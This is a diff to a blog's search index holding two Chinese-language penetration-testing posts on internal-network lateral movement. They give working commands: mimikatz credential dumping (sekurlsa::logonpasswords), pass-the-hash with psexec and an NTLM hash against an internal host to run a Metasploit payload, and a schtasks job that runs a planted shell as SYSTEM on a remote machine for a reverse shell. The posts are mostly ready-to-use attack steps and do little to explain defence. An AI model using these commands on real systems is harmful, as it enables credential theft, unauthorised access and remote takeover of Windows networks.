@@ -1,6 +1,17 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[内网渗透横向移动hash传递注入]]></title>
+    <url>%2F2018%2F10%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8hash%E4%BC%A0%E9%80%92%E6%B3%A8%E5%85%A5%2F</url>
+    <content type="text"><![CDATA[在内网渗透中有时候抓不到明文密码，也可以用hash传递注入攻击拿下另一个目标 获取hash工具地址：获取hash1q.exe -dhl hash传递注入先执行whoami命令看看：1psexec.exe Administrator@192.168.3.21 whoami -hashes AAD3B435B51404EEAAD3B435B51404EE:880FDF4355DBB26715EA2DF2C408664E 看到执行成功的。配合msf使用，开始hash传递注入：1psexec.exe Administrator@192.168.3.21 -c d:\windows.exe -hashes AAD3B435B51404EEAAD3B435B51404EE:880FDF4355DBB26715EA2DF2C408664E 说明：d:\windows.exe是本地shell的物理地址，我放到d盘目录下。msf成功获取到shell 总结又学到一个内网渗透技能…]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>内网渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[内网渗透IPC$弹shell]]></title>
     <url>%2F2018%2F10%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8FIPC-%E5%BC%B9shell%2F</url>
     <content type="text"><![CDATA[在获取到一个shell时想内网渗透 mimikatz获取秘密12privilege::debugsekurlsa::logonpasswords Windows2012系统获取秘密失败了 IPC弹shell看到有IPC连接想到用at命令执行弹shell。因为是Windows2012系统，不用at命令。提示用schtasks.exe命令，百度一番，知道怎么用schtasks.exe。先把shell放到IPC连接的目标下，比如我放到1net time \\18.217.*.* //看目标时间 设置定时任务执行程序1schtasks /create /tn foo1 /tr C:\Windows\apppatch\windows.exe /sc once /st 05:25 /S 18.217.*.* /RU System 说明：foo1是任务名称填啥都行，C:\Windows\apppatch\windows.exe是你放shell的路径，05:25是运行时间，18.217.0.0是目标msf收到反弹的shell。 总结schtasks命令比at命令复杂些，也没关系，一样能反弹shell。]]></content>
